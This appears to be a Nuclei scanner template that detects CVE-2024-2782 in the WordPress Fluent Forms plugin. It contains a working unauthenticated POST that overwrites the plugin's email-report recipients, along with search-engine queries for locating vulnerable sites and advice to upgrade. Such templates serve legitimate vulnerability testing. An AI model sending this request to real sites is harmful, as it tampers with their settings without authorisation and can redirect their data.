http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "true")
    - len(body)==4
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - "POST /wp-json/fluentform/v1/global-settings HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"key\": \"emailSummarySettings\",\n  \"email_report\"\
    : {\n    \"status\": \"yes\",\n    \"send_to_type\": \"custom\",\n    \"custom_recipients\"\
    : \"{{email}}\",\n    \"sending_day\": \"Mon\"\n  }\n}\n"
id: CVE-2024-2782
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:fluentforms:contact_form:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-2782
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-862
    epss-percentile: 0.92754
    epss-score: 0.09904
  description: 'The Contact Form Plugin by Fluent Forms for Quiz, Survey, and Drag
    & Drop WP Form Builder plugin for WordPress is vulnerable to unauthorized modification
    of data due to a missing capability check on the /wp-json/fluentform/v1/global-settings
    REST API endpoint in all versions up to, and including, 5.1.16. This makes it
    possible for unauthenticated attackers to modify all of the plugin''s settings.

    '
  impact: 'Unauthenticated attackers can modify all Fluent Forms plugin settings including
    email configurations and other sensitive parameters.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/fluentform/"
    framework: wordpress
    max-request: 1
    product: contact_form
    publicwww-query: /wp-content/plugins/fluentform/
    shodan-query: http.html:"/wp-content/plugins/fluentform/"
    vendor: fluentforms
    verified: true
  name: WordPress FluentForms <= 5.1.16 - Broken Access Control
  reference:
  - https://github.com/whale93/CVE-2024-2782-PoC
  - https://wpscan.com/vulnerability/075faf77-2787-4da7-bbfd-ea3c14993cc6/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2782
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/0814e7b3-404a-4db5-b564-46c9086ec048?source=cve
  remediation: 'Update Contact Form Plugin by Fluent Forms to version 5.1.17 or later.

    '
  severity: high
  tags: cve,cve2024,wordpress,wp-plugin,wp,fluentform,wpscan,intrusive,vkev,vuln
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
